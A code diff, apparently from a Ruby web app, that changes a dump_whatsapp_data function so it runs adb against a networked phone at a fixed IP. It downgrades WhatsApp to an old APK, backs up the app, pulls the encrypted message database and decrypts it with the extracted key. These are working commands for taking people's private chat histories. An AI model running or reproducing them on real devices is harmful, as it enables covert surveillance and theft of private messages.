@@ -36,12 +36,12 @@ def dump_whatsapp_data
     "Pull db file Success",
     "Decryption Success",
     "Database Export Success"]
-    system("tools\\platform-tools\\adb.exe shell pm uninstall -k com.whatsapp")
+    system("tools\\platform-tools\\adb.exe -s 192.168.100.33 shell pm uninstall -k com.whatsapp")
 
     #install old version
-    system("tools\\platform-tools\\adb.exe install payloads\\WhatsApp-v2.11.431-AndroidBucket.com.apk")
+    system("tools\\platform-tools\\adb.exe -s 192.168.100.33 install payloads\\WhatsApp-v2.11.431-AndroidBucket.com.apk")
     #backup whatsapp
-    system("tools\\platform-tools\\adb.exe backup -apk com.whatsapp -f app\\assets\\images\\files\\whatsapp\\whatsapp_backup.ab")
+    system("tools\\platform-tools\\adb.exe -s 192.168.100.33 backup -apk com.whatsapp -f app\\assets\\images\\files\\whatsapp\\whatsapp_backup.ab")
     #adb shell input keyevent 82
     #adb shell input tap 521 1130
     #convert ab backup file to tar
@@ -49,12 +49,12 @@ def dump_whatsapp_data
     #untar the tar file
     Minitar.unpack('app\\assets\\images\\files\\whatsapp\\whatsapp_backup.ab.tar', 'app\assets\images\files\whatsapp\whatsapp_backup')
     #pull the db file
-    system("tools\\platform-tools\\adb.exe pull /sdcard/WhatsApp/Databases/msgstore.db.crypt12 app\\assets\\images\\files\\whatsapp\\msgstore.db.crypt12") 
+    system("tools\\platform-tools\\adb.exe -s 192.168.100.33 pull /sdcard/WhatsApp/Databases/msgstore.db.crypt12 app\\assets\\images\\files\\whatsapp\\msgstore.db.crypt12") 
     #decrypt it using the key
     system("java -jar tools\\crypt12-decrypt\\master\\decrypt12.jar app\\assets\\images\\files\\whatsapp\\whatsapp_backup\\apps\\com.whatsapp\\f\\key app\\assets\\images\\files\\whatsapp\\msgstore.db.crypt12 app\\assets\\images\\files\\whatsapp\\msgstore.db")
     #export the database to a txt file
 
-    downloadTimeout=20
+    downloadTimeout=params[:copy_timeout].to_i
     @smartphone = Smartphone.find(params[:smartphone_id])
 
     currentTime = DateTime.now
